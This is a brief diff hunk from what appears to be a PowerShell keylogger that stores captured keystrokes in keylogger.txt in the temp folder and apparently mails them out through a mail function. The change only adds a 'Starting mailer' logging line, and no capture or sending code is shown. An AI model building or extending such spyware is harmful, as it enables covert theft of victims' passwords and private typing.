@@ -422,7 +422,7 @@ function mail($messageBody){
 		 }
 
 	}
-	
+	echo "Starting mailer" | out-file .\log.txt
 	$keyloggerLogFilePath = $env:temp+"\keylogger.txt"
 	while($true)
 	{
